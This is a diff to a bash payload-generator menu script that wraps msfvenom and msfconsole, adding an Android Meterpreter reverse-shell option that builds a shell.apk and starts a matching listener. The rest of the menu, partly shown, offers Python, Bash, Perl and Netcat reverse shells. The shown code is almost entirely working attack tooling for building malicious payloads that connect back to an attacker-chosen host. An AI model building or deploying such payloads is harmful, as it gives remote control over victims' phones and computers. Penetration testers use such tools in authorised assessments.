@@ -154,8 +154,9 @@ echo -e "${Green}[-]${NC} ${Red}Scripting Payloads${NC}\n\n"
 echo -e "${Cyan}[*]${NC} 16 : Python Reverse Shell\n"
 echo -e "${Cyan}[*]${NC} 17 : Bash Unix Reverse Shell\n"
 echo -e "${Cyan}[*]${NC} 18 : Perl Unix Reverse shell\n\n"
-echo -e "${Green}[-]${NC} ${Red}Linux Payloads${NC}\n\n"
+echo -e "${Green}[-]${NC} ${Red}Linux/Other Payloads${NC}\n\n"
 echo -e "${Cyan}[*]${NC} 19 : Netcat Reverse shell\n\n"
+echo -e "${Cyan}[*]${NC} 20 : Android Meterpreter Reverse Shell\n\n"
 
 echo -e "${Cyan}[-]${NC} Select payload number : "
 
@@ -237,6 +238,10 @@ case $payload in
 	    msfvenom -p cmd/unix/reverse_netcat LHOST=$ipaddr LPORT=$port > shell
 	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload cmd/unix/reverse_netcat; set LHOST $ipaddr; set LPORT $port; exploit -j"
 	    ;;
+	20)	echo -e "${Cyan}[*]${NC} msfvenom -p android/meterpreter/reverse_tcp R > shell.apk\n"
+	   	msfvenom -p android/meterpreter/reverse_tcp LHOST=$ipaddr LPORT=$port R > shell.apk
+	   	msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload android/meterpreter/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
+	   ;;
 	*)
 		exit 1
 	    ;;
